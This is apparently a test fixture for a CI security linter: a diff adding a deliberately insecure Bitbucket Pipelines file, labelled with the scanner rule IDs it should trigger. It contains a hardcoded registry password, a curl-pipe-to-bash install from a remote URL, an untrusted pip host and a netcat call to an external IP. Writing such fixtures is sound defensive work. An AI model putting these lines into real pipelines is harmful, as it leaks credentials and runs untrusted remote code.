@@ -1,0 +1,22 @@
+# path: bitbucket-pipelines.yml
+# expect: TG-BB-001, TG-BB-002, TG-BB-003, TG-BB-004, TG-BB-005, TG-SEC-001
+image: atlassian/default-image:latest
+pipelines:
+  default:
+    - step:
+        name: Build
+        image:
+          name: python:3.12
+          username: ci
+          password: hunter2hunter2
+        script:
+          - curl -sSL https://example.com/install.sh | bash
+          - pip install --trusted-host pypi.example.com -r requirements.txt
+          - nc 10.2.2.2 1234
+  branches:
+    main:
+      - parallel:
+          - step:
+              name: Lint
+              script:
+                - make lint
